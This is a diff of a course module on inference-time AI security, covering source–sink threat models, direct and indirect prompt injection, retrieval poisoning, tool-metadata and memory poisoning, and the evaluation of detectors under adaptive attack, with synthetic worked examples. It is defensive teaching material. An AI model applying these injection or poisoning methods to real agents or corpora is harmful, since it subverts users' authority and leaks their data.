@@ -2,25 +2,57 @@
 
 ## 00 Why This Module Exists
 
-An LLM reads instructions and data in the same token stream. Any text that reaches its context—user input, a retrieved page, an email, a tool result—can influence what it outputs and which actions it chooses. When that output is rendered, executed, or turned into a tool call carrying real credentials, a text-level manipulation becomes a system-level compromise. AI security is the discipline of modeling where untrusted text enters, which privileged sinks it can reach, and which architectural controls hold even when the model is fooled.
+An LLM reads instructions and data in the same token stream.
+- Any text that reaches its context—user input, a retrieved page, an email, a tool result—can influence what it outputs and which actions it chooses.
+- When that output is rendered, executed, or turned into a tool call carrying real credentials, a text-level manipulation becomes a system-level compromise.
+- AI security models where untrusted text enters, which privileged sinks it can reach, and which architectural controls hold even when the model is fooled.
 
-```text
-untrusted sources                     model                    privileged sinks
-user input / web / email / docs --> [ context ] --> output --> renderer / SQL / shell / fetch
-retrieved corpus / tool outputs         |                      tool calls with credentials
-                                        v
-                        authority check per action (principal, intent, provenance)
-                        sandbox + egress allowlist + limits + audit
+```mermaid
+flowchart LR
+    subgraph SRC["untrusted sources"]
+        U1["user input / web / email / docs"]
+        U2["retrieved corpus / tool outputs"]
+    end
+
+    subgraph MODEL["model"]
+        CTX["context"]
+    end
+
+    OUTP["output"]
+
+    subgraph SINKS["privileged sinks"]
+        S1["renderer / SQL / shell / fetch"]
+        S2["tool calls with credentials"]
+    end
+
+    GUARD["<b>authority check per action</b><br/>principal · intent · provenance<br/>sandbox + egress allowlist + limits + audit"]
+
+    U1 --> CTX
+    U2 --> CTX
+    CTX --> OUTP
+    OUTP --> S1
+    OUTP --> S2
+    CTX --> GUARD
 ```
 
-Module 12 introduced authority policy for tool calls and the budget reservation ledger; Module 13 the validation ladder; Module 16 adaptive search. This module owns the inference-time threat model and security controls. Module 23 owns operational detection and incident response. Module 19 owns training-time data and checkpoint poisoning and harmful fine-tuning in adaptation pipelines (Lesson 19.4); here an adaptation data feed is only one more untrusted source in the source–sink graph, and those attacks are not taught again.
+Legend: the guard box is the set of controls that must hold even when the model is fooled; a principal is who the action runs for, provenance is where each argument came from.
+
+Module boundaries:
+- Module 12 introduced authority policy for tool calls and the budget reservation ledger; Module 13 the validation ladder; Module 16 adaptive search.
+- This module owns the inference-time threat model and security controls.
+- Module 23 owns operational detection and incident response.
+- Module 19 owns training-time data and checkpoint poisoning and harmful fine-tuning in adaptation pipelines (Lesson 19.4). Here an adaptation data feed is only one more untrusted source in the source–sink graph, and those attacks are not taught again.
+
 **Research cutoff:** 2026-09-30. Papers quoted with numbers were re-read in full text on 2026-10-01; see the experiment cards in Section 05.
 
 **Module Orientation**
 - **Engineering Problem**: Keep an LLM system's data and authority safe when some of its inputs are written by adversaries and the model itself cannot be trusted to tell instructions from data.
 - **What You Will Do**: Build a source–sink threat model, execute direct/indirect injection and retrieval poisoning in a sandbox, evaluate detectors under adaptive attack, implement per-action authorization, an egress policy proxy, and a per-principal budget ledger, trace AgentDojo, and diagnose an exfiltration incident.
 - **Environment**: Python 3.10+, an isolated agent sandbox with mock email/files/banking tools, a small vector store, AgentDojo or equivalent harness, a network egress proxy with a sandbox-only resolver and listener, and no production credentials.
-- **Evidence Rule**: Keep source observations (**O**), explicit derivations (**D**), and telemetry-dependent hypotheses (**H**) separate. Every rate in a worked example is synthetic unless it carries an experiment-card reference (EC-1 to EC-14). All attack work runs only in authorized sandboxes, with canary values instead of real secrets and reserved names (`.example`, `.test`) instead of real endpoints.
+- **Evidence Rule**:
+  - Keep source observations (**O**), explicit derivations (**D**), and telemetry-dependent hypotheses (**H**) separate.
+  - Every rate in a worked example is synthetic unless it carries an experiment-card reference (EC-1 to EC-14).
+  - All attack work runs only in authorized sandboxes, with canary values instead of real secrets and reserved names (`.example`, `.test`) instead of real endpoints.
 - **If You Only Have One Week**: Lessons 18.1, 18.2, 18.4 — they map sources, sinks, and authority, demonstrate injection and poisoning, and enforce per-action authorization that survives model compromise; probabilistic defenses, output handling, and red teaming build on those three.
 
 ## 01 Baseline Assumptions
@@ -71,7 +103,18 @@ The learner must model trust boundaries and source–sink paths, execute and exp
 
 ## 03 Knowledge Map
 
-Assets & Principals $\to$ Trust Boundaries $\to$ Untrusted Sources $\to$ Model Context $\to$ Output & Tool Calls $\to$ Privileged Sinks. Attacks: direct injection, indirect injection, retrieval poisoning, jailbreak, output-channel exfiltration, resource exhaustion. Controls, from weakest guarantee to strongest: prompt-level marking $\to$ detectors/filters $\to$ output encoding/sandbox/egress $\to$ per-action authorization $\to$ control/data separation and path removal. Evaluation: benign utility, utility under attack, adaptive attack success, audit evidence.
+```mermaid
+flowchart LR
+    subgraph PATH["attack surface"]
+        AP["Assets & Principals"] --> TB["Trust Boundaries"] --> US["Untrusted Sources"] --> MC["Model Context"] --> OT["Output & Tool Calls"] --> PS["Privileged Sinks"]
+    end
+    subgraph CTRL["controls: weakest → strongest guarantee"]
+        C1["prompt-level marking"] --> C2["detectors / filters"] --> C3["output encoding / sandbox / egress"] --> C4["per-action authorization"] --> C5["control/data separation<br/>and path removal"]
+    end
+```
+
+- **Attacks**: direct injection, indirect injection, retrieval poisoning, jailbreak, output-channel exfiltration, resource exhaustion.
+- **Evaluation**: benign utility, utility under attack, adaptive attack success, audit evidence.
 
 ## 04 Lessons
 
@@ -88,7 +131,11 @@ Which untrusted texts can reach which privileged actions, and under whose author
 - **Taxonomy**: the OWASP Top 10 for LLM Applications 2025 lists Prompt Injection, Sensitive Information Disclosure, Supply Chain, Data and Model Poisoning, Improper Output Handling, Excessive Agency, System Prompt Leakage, Vector and Embedding Weaknesses, Misinformation, and Unbounded Consumption (**O**, CLM-002). Use it to prompt enumeration, not as a completed threat model.
 
 **Mechanism Explanation:**
-Because no architectural instruction/data separation exists inside the model, risk is set by the source–sink graph (**D**, CLM-001). Draw the data-flow diagram; mark each source as trusted/untrusted and each sink by blast radius; record the credential each sink uses. A path "untrusted source → context → sink with sensitive authority or egress" is an attack path until a control breaks it.
+Because no architectural instruction/data separation exists inside the model, risk is set by the source–sink graph (**D**, CLM-001). Procedure:
+- Draw the data-flow diagram.
+- Mark each source as trusted/untrusted and each sink by blast radius.
+- Record the credential each sink uses.
+- A path "untrusted source → context → sink with sensitive authority or egress" is an attack path until a control breaks it.
 
 **Quantitative Model / Derivation:**
 Attack paths $\approx |S_{untrusted}|\times|K_{reachable}|$ after authorization filtering, where $K_{reachable}$ are sinks callable after untrusted content enters context. Removing a source class or sink class removes every path through it; adding a detector only lowers the probability on each path.
@@ -101,7 +148,12 @@ Attack paths $\approx |S_{untrusted}|\times|K_{reachable}|$ after authorization 
 - *Input.* An email assistant.
   - Sources: user message (trusted), inbox messages (untrusted), attachments (untrusted), web fetch (untrusted).
   - Sinks: `send_email` (external egress), `read_files` (sensitive read), Markdown renderer (image URLs are egress), calendar write (low sensitivity, not counted below).
-- *Steps.* Count untrusted source × egress-or-sensitive sink: $|S_{untrusted}|=3$ (inbox, attachments, web fetch) and $|K_{reachable}|=3$ (`send_email`, `read_files`, renderer), so $3\times3=9$ candidate paths. Requiring explicit user confirmation of recipients on `send_email` cuts its 3 paths. Rendering images only through the policy proxy of Lesson 18.5 cuts the renderer's 3 paths to unauthorized hosts.
+- *Steps.* Count untrusted source × egress-or-sensitive sink:
+  - Untrusted sources: $|S_{untrusted}|=3$ (inbox, attachments, web fetch).
+  - Reachable sinks: $|K_{reachable}|=3$ (`send_email`, `read_files`, renderer).
+  - Candidate paths: $3\times3=9$.
+  - Requiring explicit user confirmation of recipients on `send_email` cuts its 3 paths.
+  - Rendering images only through the policy proxy of Lesson 18.5 cuts the renderer's 3 paths to unauthorized hosts.
 - *Result.* $9-3-3=3$ residual paths, all through `read_files`.
 - *Interpretation and limits.*
   - `read_files` cannot send data out by itself. It matters because it puts sensitive data in context for any egress sink that remains, so a sensitive read and an egress sink must be analysed as a pair.
@@ -139,24 +191,48 @@ How do attacker-authored instructions and facts reach the model, and why doesn't
 **Concepts & Definitions:**
 - **Direct prompt injection**: the user supplies instructions that override the operator's intent.
 - **Indirect prompt injection**: adversaries place instructions in data the application will later retrieve; Greshake et al. demonstrated data theft, worming, ecosystem contamination, and manipulated API use against real 2023 systems (**O**, CLM-003).
-- **Retrieval poisoning**: the attacker writes passages into the corpus so that a target question returns a target answer. PoisonedRAG states two conditions a malicious text must meet: it must be retrieved for the target question, and the model must produce the target answer when the text is in context. With five injected texts per target question and top-5 retrieval, its authors report attack success of 0.74–0.99 across three corpora of 2.7–8.8 million texts and eight models (**O**, CLM-004; author-reported, experiment card EC-1). These are rates for 100 chosen closed-ended questions per corpus, not a prevalence estimate for any deployed system.
+- **Retrieval poisoning**: the attacker writes passages into the corpus so that a target question returns a target answer.
+  - PoisonedRAG states two conditions a malicious text must meet: it must be retrieved for the target question, and the model must produce the target answer when the text is in context.
+  - With five injected texts per target question and top-5 retrieval, its authors report attack success of 0.74–0.99 across three corpora of 2.7–8.8 million texts and eight models (**O**, CLM-004; author-reported, experiment card EC-1).
+  - These are rates for 100 chosen closed-ended questions per corpus, not a prevalence estimate for any deployed system.
 - **Jailbreak**: bypassing safety behavior; Zou et al. showed optimized adversarial suffixes can transfer to other aligned models, including black-box ones (**O**, CLM-005).
 - **Three events that must not be merged**, for one trial of a target query against a poisoned corpus:
   - $R$ — *retrieved*: at least one poisoned passage is in the context actually sent to the model. This is read from the context log, not inferred from the answer.
   - $T$ — *target match*: the answer contains the attacker's target answer. This is observable from the output alone.
   - $A$ — *causal adoption*: the answer matches the target *because of* a poisoned passage in context. It is not directly observable. It is estimated from controls and provenance (below).
 - **Agent-specific injection channels (2025–2026 primary papers; all author-reported, none reproduced here; cards EC-6 to EC-14 in Section 05)**. The same mechanism—attacker text reaches the context—arrives through sources that the older threat models treated as trusted configuration or as the agent's own past:
-  - *Tool-description (metadata) poisoning*: instructions placed in a tool's description are loaded into context when a tool server registers, before any user task. In MCPTox the poisoned tool is never called; the instruction steers the agent to misuse a *legitimate* tool, and the authors report a mean ASR of 36.5% across 20 agent settings with refusals under 3%, using non-adaptive, template-generated cases (**O**, CLM-023). A second benchmark reports near-100% ASR for some models in a sandbox with side-effect checks (**O**, CLM-024).
+  - *Tool-description (metadata) poisoning*: instructions placed in a tool's description are loaded into context when a tool server registers, before any user task.
+    - In MCPTox the poisoned tool is never called; the instruction steers the agent to misuse a *legitimate* tool.
+    - Its authors report a mean ASR of 36.5% across 20 agent settings with refusals under 3%, using non-adaptive, template-generated cases (**O**, CLM-023).
+    - A second benchmark reports near-100% ASR for some models in a sandbox with side-effect checks (**O**, CLM-024).
   - *Tool-selection hijacking*: a crafted tool document added to a tool library is retrieved and selected for a target task without the attacker seeing the library, retriever, or model (**O**, CLM-025).
   - *Memory poisoning*: records written into an agent's long-term memory are later retrieved as demonstrations or context. One attack writes them through ordinary queries to a memory bank shared across users (**O**, CLM-026); another writes them through a web page the agent merely viewed, then activates in a later task on a different site (**O**, CLM-027).
   - *Visual injection*: instructions rendered on screen reach computer-use agents through screenshots, so text-level filters on HTML never see them (**O**, CLM-028).
 
 **Mechanism Explanation:**
-Indirect injection works because the model conditions on all context tokens; an instruction inside a retrieved page is just more text. Poisoning works because retrieval ranks by similarity, and an attacker can craft text similar to the target query that also carries the desired claim or instruction. Jailbreak transfer shows that alignment is a learned tendency, not an enforced boundary. None of these requires breaking cryptography or code—only write access to some source.
+- **Indirect injection** works because the model conditions on all context tokens; an instruction inside a retrieved page is just more text.
+- **Poisoning** works because retrieval ranks by similarity, and an attacker can craft text similar to the target query that also carries the desired claim or instruction.
+- **Jailbreak transfer** shows that alignment is a learned tendency, not an enforced boundary.
+- None of these requires breaking cryptography or code—only write access to some source.
 
-The agent channels change *when* and *with what standing* the attacker's text arrives. Tool metadata enters before the user speaks and is read as part of the agent's configuration. Memory records are read as the agent's own prior experience, and they persist across tasks, so the attack and its effect can be separated in time and site. A tool-selection attack does not ask the model to do anything unusual; it makes the attacker's tool the plausible choice. In every case the model sees text it cannot authenticate, and the defense question is where authority is decided—Lesson 18.4 analyses each channel.
+The agent channels change *when* and *with what standing* the attacker's text arrives:
+- Tool metadata enters before the user speaks and is read as part of the agent's configuration.
+- Memory records are read as the agent's own prior experience, and they persist across tasks, so the attack and its effect can be separated in time and site.
+- A tool-selection attack does not ask the model to do anything unusual; it makes the attacker's tool the plausible choice.
+- In every case the model sees text it cannot authenticate, and the defense question is where authority is decided—Lesson 18.4 analyses each channel.
 
-A target match has more than one possible cause. The model may already hold the target answer as prior knowledge. A response cache may replay an answer produced by an earlier poisoned run. Another document, such as a stale legitimate page, may state the same thing. Each is an *alternate path* from some source to the answer. Finding $T$ without $R$ is therefore a finding to investigate, not a row to delete.
+A target match has more than one possible cause. Each is an *alternate path* from some source to the answer:
+
+```mermaid
+flowchart LR
+    PP["poisoned passage<br/>in delivered context (R)"] --> T["answer matches target (T)"]
+    PR["model prior knowledge"] --> T
+    RC["response cache replaying<br/>an earlier poisoned run"] --> T
+    OD["another document<br/>(e.g. stale legitimate page)"] --> T
+```
+
+- Legend: only the top edge is visible in the context log as $R$; the other three produce $T$ without $R$.
+- Finding $T$ without $R$ is therefore a finding to investigate, not a row to delete.
 
 **Quantitative Model / Derivation** (**D**, CLM-016):
 By the law of total probability over $R$:
@@ -165,25 +241,52 @@ $$
 P(T)=P(R)\,P(T\mid R)+P(\neg R)\,P(T\mid\neg R).
 $$
 
-*where:* $R$, $T$ are the events defined above; $\neg R$ is "no poisoned passage in the delivered context", so $P(\neg R)=1-P(R)$; $P(T\mid R)$ is the probability of $T$ among trials where $R$ occurred; $\wedge$ means "and" (both events in the same trial).
+*where:*
+- $R$, $T$: the events defined above (retrieved, target match).
+- $\neg R$: "no poisoned passage in the delivered context", so $P(\neg R)=1-P(R)$.
+- $P(T\mid R)$: probability of $T$ among trials where $R$ occurred (dimensionless).
+- $\wedge$: "and" (both events in the same trial).
 
-*Step-by-step.* Every trial falls in exactly one of $R$ or $\neg R$, so the target-match trials split into two disjoint groups: $P(T)=P(T\wedge R)+P(T\wedge\neg R)$. By the definition of conditional probability, $P(T\wedge R)=P(R)\,P(T\mid R)$ and $P(T\wedge\neg R)=P(\neg R)\,P(T\mid\neg R)$. Substituting gives the equation. In counts: target matches $=$ (matches with $R$) $+$ (matches without $R$).
+*Step-by-step.*
+1. Every trial falls in exactly one of $R$ or $\neg R$, so the target-match trials split into two disjoint groups: $P(T)=P(T\wedge R)+P(T\wedge\neg R)$.
+2. By the definition of conditional probability, $P(T\wedge R)=P(R)\,P(T\mid R)$ and $P(T\wedge\neg R)=P(\neg R)\,P(T\mid\neg R)$.
+3. Substituting gives the equation.
+
+In counts: target matches $=$ (matches with $R$) $+$ (matches without $R$).
 
 - $P(R)$ has all trials as its denominator.
 - $P(T\mid R)$ has only the trials where $R$ occurred as its denominator. This is the "follow" rate. Dividing target matches by *all* trials gives $P(T)$, which is a different number.
 - The retrieved path contributes $P(R)\,P(T\mid R)$. The older shorthand $p_r\,p_f$ equals $P(T)$ only when $p_f$ means $P(T\mid R)$ and $P(T\mid\neg R)=0$.
 - With $m$ poisoned passages, $P(R)=1-\prod_i(1-p_{r,i})$ holds only if the passages are retrieved independently. Passages crafted for the same query are similar, so measure $R$ per trial instead of composing per-passage rates.
-  - *where:* $p_{r,i}$ is the per-trial retrieval rate of poisoned passage $i$, and $\prod_i$ multiplies over $i=1,\dots,m$. *Steps:* $1-p_{r,i}$ is the chance passage $i$ is missed; under independence all $m$ are missed with probability $\prod_i(1-p_{r,i})$; $R$ is the complement. Example: two passages at 0.5 each give $1-0.5\times0.5=0.75$. If the two are near-duplicates that are retrieved together or not at all, the true $P(R)$ is 0.5, so the formula overstates it.
+  - *where:*
+    - $p_{r,i}$: per-trial retrieval rate of poisoned passage $i$ (fraction).
+    - $\prod_i$: product over $i=1,\dots,m$, where $m$ is the number of poisoned passages.
+  - *Steps:*
+    - $1-p_{r,i}$ is the chance passage $i$ is missed.
+    - Under independence all $m$ are missed with probability $\prod_i(1-p_{r,i})$.
+    - $R$ is the complement.
+  - Example: two passages at 0.5 each give $1-0.5\times0.5=0.75$.
+    - If the two are near-duplicates that are retrieved together or not at all, the true $P(R)$ is 0.5, so the formula overstates it.
 
 Two controls give the alternate-path terms a value:
 
 - **No-poison control**: the same queries, seeds, and decoding settings on the clean corpus. Its target-match rate $P_0(T)$ is what prior knowledge and other documents produce without the attack.
 - **No-retrieval control**: the same queries with retrieval disabled and the cache bypassed. Its target-match rate is what the model produces from its own parameters.
 
-The attributable effect of poisoning is estimated by $P(T)-P_0(T)$ on matched trials. Here $P(T)$ is the target-match rate on the poisoned corpus and $P_0(T)$ the rate on the clean corpus with the same queries, seeds, and decoding; the subtraction removes the matches that would have happened without the attack. "Adoption without retrieval is impossible" is true only by definition: it holds if $A$ is defined as causation through the retrieval path *and* that path is the only way poisoned text reaches the answer. A cache breaks the second condition.
+The attributable effect of poisoning is estimated by $P(T)-P_0(T)$ on matched trials.
+- $P(T)$: target-match rate on the poisoned corpus.
+- $P_0(T)$: rate on the clean corpus with the same queries, seeds, and decoding.
+- The subtraction removes the matches that would have happened without the attack.
+
+"Adoption without retrieval is impossible" is true only by definition. It holds only if both:
+- $A$ is defined as causation through the retrieval path, *and*
+- that path is the only way poisoned text reaches the answer. A cache breaks this second condition.
 
 **Worked Example** (synthetic counts, registry CLM-020; no system was measured):
-- *Input.* A 10,000-document sandbox corpus is seeded with 5 passages written for "What is the refund window?" that assert "90 days"; the true policy is 30 days. Retrieval is top-5. There are 50 paraphrases × 4 seeds = 200 trials, each logging the delivered context, passage IDs, cache status, and answer.
+- *Input.*
+  - A 10,000-document sandbox corpus is seeded with 5 passages written for "What is the refund window?" that assert "90 days"; the true policy is 30 days.
+  - Retrieval is top-5.
+  - 50 paraphrases × 4 seeds = 200 trials, each logging the delivered context, passage IDs, cache status, and answer.
 - *Step 1 — contingency table.*
 
 | | $T$ (answer says 90 days) | $\neg T$ | Total |
@@ -199,8 +302,13 @@ The attributable effect of poisoning is estimated by $P(T)-P_0(T)$ on matched tr
   - $P(T\mid\neg R)=4/80=0.05$.
   - Check: $0.48+0.40\times0.05=0.50=P(T)=100/200$. Here $0.40=P(\neg R)=80/200$, and $0.40\times0.05=0.02$ is the 4 of 200 matches without retrieval; $96+4=100$.
 - *Step 3 — controls.* No-poison control: 6 of 200 answers say 90 days, so $P_0(T)=0.03$. No-retrieval control: 5 of 200, so $0.025$.
-- *Step 4 — provenance of the four $T\wedge\neg R$ trials.* Two were served from a response cache filled by earlier poisoned trials; the cache key ignored the corpus version. One cites a stale legitimate page that still says 90 days. One has no supporting passage.
-- *Result.* Poisoning raised target match from 0.03 to 0.50, an estimated attributable difference of 0.47 ($0.50-0.03$, i.e. about 94 of 200 trials). Of the 100 matches, 96 had a poisoned passage in context in that trial and 2 were replayed from the cache.
+- *Step 4 — provenance of the four $T\wedge\neg R$ trials.*
+  - Two were served from a response cache filled by earlier poisoned trials; the cache key ignored the corpus version.
+  - One cites a stale legitimate page that still says 90 days.
+  - One has no supporting passage.
+- *Result.*
+  - Poisoning raised target match from 0.03 to 0.50, an estimated attributable difference of 0.47 ($0.50-0.03$, i.e. about 94 of 200 trials).
+  - Of the 100 matches, 96 had a poisoned passage in context in that trial and 2 were replayed from the cache.
 - *Interpretation and limits.*
   - Multiplying $P(R)$ by the unconditional $P(T)$ gives $0.60\times0.50=0.30$. That number describes nothing in the table.
   - The 24 trials with $R$ but not $T$ show retrieval without a target match. That is consistent with model-side resistance or with competing passages, and the table alone cannot tell which.
@@ -242,24 +350,53 @@ Execute and explain injection and poisoning mechanisms, including tool-metadata,
 What do prompt-level defenses and detectors actually buy, and how must they be evaluated?
 
 **Concepts & Definitions:**
-- **Spotlighting**: input transformations (delimiting, datamarking, encoding) that mark where untrusted text begins and ends. Its authors report that, against a fixed corpus of 1,000 documents carrying a keyword-payload injection, attack success on GPT-family models fell from above 50% to below 2% (**O**, CLM-006; author-reported, static attack, experiment card EC-2). The paper itself warns that delimiting is easy to subvert once the attacker knows the system prompt.
+- **Spotlighting**: input transformations (delimiting, datamarking, encoding) that mark where untrusted text begins and ends.
+  - Its authors report that, against a fixed corpus of 1,000 documents carrying a keyword-payload injection, attack success on GPT-family models fell from above 50% to below 2% (**O**, CLM-006; author-reported, static attack, experiment card EC-2).
+  - The paper itself warns that delimiting is easy to subvert once the attacker knows the system prompt.
 - **Detector**: a classifier on inputs or tool outputs (e.g., AgentDojo's `TransformersBasedPIDetector` defaults to a DeBERTa prompt-injection model).
 - **Static attack**: a fixed set of attack inputs written without access to the deployed defense, each tried once.
-- **Adaptive attack**: a search that optimizes against the deployed defense with a stated budget and stated feedback. Nasr et al. evaluate 12 defenses and report attack success above 90% for most of them, where most had originally reported near-zero success (**O**, CLM-007; author-reported, experiment card EC-3). In their AgentDojo experiments the search attack had up to 800 queries per scenario on an 80-sample subset. Spotlighting's success rate there was 0–28% under the benchmark's static attack and 47–99% under search, depending on the model. With *no added defense* the same four models were at 75–100% under the same search, so the comparison that matters is defended-adaptive against undefended-adaptive, not against the static number.
+- **Adaptive attack**: a search that optimizes against the deployed defense with a stated budget and stated feedback.
+  - Nasr et al. evaluate 12 defenses and report attack success above 90% for most of them, where most had originally reported near-zero success (**O**, CLM-007; author-reported, experiment card EC-3).
+  - In their AgentDojo experiments the search attack had up to 800 queries per scenario on an 80-sample subset.
+  - Spotlighting's success rate there was 0–28% under the benchmark's static attack and 47–99% under search, depending on the model.
+  - With *no added defense* the same four models were at 75–100% under the same search, so the comparison that matters is defended-adaptive against undefended-adaptive, not against the static number.
 - **ASR@budget**: attack success reported together with attempts per case, what the attacker observes, and what the attacker knows. Without these three, two ASR values cannot be compared.
 - **More adaptive evidence (2025–2026)**:
-  - Zhan et al. re-tested eight indirect-injection defenses (two detectors, perplexity filtering, three prompt-level defenses, paraphrasing, adversarial fine-tuning) on a 100-case InjecAgent subset with white-box adaptive strings trained for up to 500 steps, and report ASR above 50% against every one (**O**, CLM-029; EC-10). Their adaptive attacker knows and can differentiate through the defense, which is a stronger assumption than a remote attacker usually has.
-  - LLMail-Inject ran a public challenge in which participants knew the deployed defenses and could submit freely. Of 370,724 phase-1 submissions, 3,018 (0.8%) were end-to-end successes; the funnel shows the deeper stages are where most attempts failed (**O**, CLM-030; EC-11). A low per-submission rate is not a low risk: one success is enough, and the organisers report that some defenses needed a few hundred attempts before the first success.
-    - *Why a low rate still means high risk (illustrative arithmetic, not from the paper).* If each attempt independently succeeds with probability $p$, the chance of at least one success in $n$ attempts is $1-(1-p)^n$. With $p=0.008$ and $n=100$: $1-0.992^{100}\approx0.55$. Real attackers learn from feedback, so attempts are not independent and the true chance is usually higher.
-  - Narisetty et al. re-ran one out-of-band defense (Progent) on an AgentDojo subsample with a hand-crafted, defense-aware template and report mean ASR 25.8% undefended, 4.2% defended, 2.6% under their adaptive template, at a utility cost from about 45% to about 26% (**O**, CLM-031; EC-12). The authors themselves call it one small data point that does not establish robustness against an optimized attack.
+  - **Zhan et al.** (**O**, CLM-029; EC-10):
+    - Re-tested eight indirect-injection defenses (two detectors, perplexity filtering, three prompt-level defenses, paraphrasing, adversarial fine-tuning) on a 100-case InjecAgent subset.
+    - White-box adaptive strings trained for up to 500 steps; ASR above 50% against every one.
+    - Their adaptive attacker knows and can differentiate through the defense, which is a stronger assumption than a remote attacker usually has.
+  - **LLMail-Inject** (**O**, CLM-030; EC-11):
+    - A public challenge in which participants knew the deployed defenses and could submit freely.
+    - Of 370,724 phase-1 submissions, 3,018 (0.8%) were end-to-end successes; the funnel shows the deeper stages are where most attempts failed.
+    - A low per-submission rate is not a low risk: one success is enough, and the organisers report that some defenses needed a few hundred attempts before the first success.
+    - *Why a low rate still means high risk (illustrative arithmetic, not from the paper).*
+      - If each attempt independently succeeds with probability $p$, the chance of at least one success in $n$ attempts is $1-(1-p)^n$.
+      - With $p=0.008$ and $n=100$: $1-0.992^{100}\approx0.55$.
+      - Real attackers learn from feedback, so attempts are not independent and the true chance is usually higher.
+  - **Narisetty et al.** (**O**, CLM-031; EC-12):
+    - Re-ran one out-of-band defense (Progent) on an AgentDojo subsample with a hand-crafted, defense-aware template.
+    - Mean ASR 25.8% undefended, 4.2% defended, 2.6% under their adaptive template, at a utility cost from about 45% to about 26%.
+    - The authors themselves call it one small data point that does not establish robustness against an optimized attack.
 
 **Mechanism Explanation:**
-Defenses that rely on the model or a classifier recognizing malice are probabilistic. They lower opportunistic success, add latency and false positives, and can be optimized against. Evaluate them with the attacker moving second: fixed attack strings are a smoke test, not evidence of robustness. An empirical evaluation cannot prove a defense robust. It can only report that a search of a stated strength failed to break it.
+Defenses that rely on the model or a classifier recognizing malice are probabilistic:
+- They lower opportunistic success, add latency and false positives, and can be optimized against.
+- Evaluate them with the attacker moving second: fixed attack strings are a smoke test, not evidence of robustness.
+- An empirical evaluation cannot prove a defense robust. It can only report that a search of a stated strength failed to break it.
 
 **Quantitative Model / Derivation:**
-If detectors had independent miss rates $1-d_i$, residual $=\prod_i(1-d_i)$. Independence is an assumption to test on the joint data, not a default. An adaptive attacker searches for inputs that evade all layers jointly, creating correlated misses; the residual must be measured on the composition (**D**, CLM-008). Also account for the benign false-positive rate $f$ of the *composed* stack: at request volume $V$, $fV$ legitimate requests are blocked or degraded. If either of two detectors can block, the composed $f$ lies between the larger single rate and the sum of the two.
+- If detectors had independent miss rates $1-d_i$, residual $=\prod_i(1-d_i)$.
+- Independence is an assumption to test on the joint data, not a default. An adaptive attacker searches for inputs that evade all layers jointly, creating correlated misses; the residual must be measured on the composition (**D**, CLM-008).
+- Also account for the benign false-positive rate $f$ of the *composed* stack: at request volume $V$, $fV$ legitimate requests are blocked or degraded.
+- If either of two detectors can block, the composed $f$ lies between the larger single rate and the sum of the two.
 
-*where:* $d_i$ is detector $i$'s catch (detection) rate on attack inputs, so $1-d_i$ is its miss rate; $\prod_i$ multiplies over the stacked detectors; "residual" is the fraction of attack inputs that pass every layer; $f_i$ is detector $i$'s false-positive rate on benign requests, $f$ the stack's; $V$ is benign requests per period.
+*where:*
+- $d_i$: detector $i$'s catch (detection) rate on attack inputs, so $1-d_i$ is its miss rate (fraction).
+- $\prod_i$: product over the stacked detectors.
+- residual: fraction of attack inputs that pass every layer.
+- $f_i$: detector $i$'s false-positive rate on benign requests; $f$: the stack's (fraction).
+- $V$: benign requests per period.
 
 *Step-by-step.*
 1. An attack input gets through the stack only if *every* layer misses it. If misses were independent, the joint miss probability would be the product of the single miss probabilities.
@@ -275,9 +412,17 @@ If detectors had independent miss rates $1-d_i$, residual $=\prod_i(1-d_i)$. Ind
   1. Each detector misses $20/400=0.05$, so $d_1=d_2=0.95$. Independence predicts a joint miss rate of $0.05\times0.05=0.0025$, which is 1 input in 400.
   2. The joint log shows 6 inputs missed by both: $6/400=1.5\%$, six times the prediction. The misses are correlated even before any adaptation.
   3. The adaptive search finds at least one input that passes both detectors and achieves the attacker goal in 30 of 50 scenarios: ASR@500 $=60\%$.
-  4. Benign cost: $0.016\times1{,}000{,}000=16{,}000$ legitimate requests blocked or degraded per day. The bounds are 10,000 and 20,000 ($\max(0.01,0.01)\times V$ and $(0.01+0.01)\times V$). Overlap: $0.01+0.01-0.016=0.004$, so 4,000 benign requests per day are flagged by both detectors; independence would predict $1-0.99^2=0.0199$, i.e. only 100 flagged by both.
+  4. Benign cost:
+     - $0.016\times1{,}000{,}000=16{,}000$ legitimate requests blocked or degraded per day.
+     - Bounds: 10,000 and 20,000 ($\max(0.01,0.01)\times V$ and $(0.01+0.01)\times V$).
+     - Overlap: $0.01+0.01-0.016=0.004$, so 4,000 benign requests per day are flagged by both detectors.
+     - Independence would predict $1-0.99^2=0.0199$, i.e. only 100 flagged by both.
 - *Result.* Static joint residual 1.5%, adaptive ASR@500 60%, benign false positives 1.6%.
-- *Interpretation and limits.* The stack is useful depth against opportunistic traffic and is not a boundary. The 60% and the 1.5% have different denominators (scenarios against inputs) and different attacker budgets, so their ratio means nothing. A different budget or different feedback would give a different adaptive number. An undefended adaptive baseline is needed before crediting the stack with any reduction.
+- *Interpretation and limits.*
+  - The stack is useful depth against opportunistic traffic and is not a boundary.
+  - The 60% and the 1.5% have different denominators (scenarios against inputs) and different attacker budgets, so their ratio means nothing.
+  - A different budget or different feedback would give a different adaptive number.
+  - An undefended adaptive baseline is needed before crediting the stack with any reduction.
 
 **Knowledge Check:**
 1. Why does a near-zero ASR on a static benchmark say little about an adaptive attacker?
@@ -313,19 +458,50 @@ How do we keep an agent's legitimate authority from being directed by text it re
 - **Confused deputy**: Hardy's privileged program induced to misuse its own authority because it acted on a caller-supplied name with ambient privileges (**O**, CLM-009).
 - **Agent as deputy**: an agent executing tools with full user/service credentials after reading attacker content is a confused deputy unless each action is authorized against the originating principal and data provenance (**D**, CLM-010). OWASP calls the enabling condition Excessive Agency.
 - **Capability**: authority bound to a specific object and operation, passed explicitly.
-- **Control/data separation**: CaMeL derives control and data flow from the trusted query, handles untrusted data in a quarantined model that cannot call tools, and enforces capability policies at tool calls. Its authors report 77% of AgentDojo tasks solved with CaMeL against 84% for the same model with native tool calling (**O**, CLM-011; author-reported, FRONTIER, experiment card EC-4). That pair is one model's row. Across the six model rows of the same table the change in benign utility ranges from −3.1 to −32.0 percentage points.
+- **Control/data separation**: CaMeL derives control and data flow from the trusted query, handles untrusted data in a quarantined model that cannot call tools, and enforces capability policies at tool calls.
+  - Its authors report 77% of AgentDojo tasks solved with CaMeL against 84% for the same model with native tool calling (**O**, CLM-011; author-reported, FRONTIER, experiment card EC-4).
+  - That pair is one model's row. Across the six model rows of the same table the change in benign utility ranges from −3.1 to −32.0 percentage points.
 
 **Mechanism Explanation:**
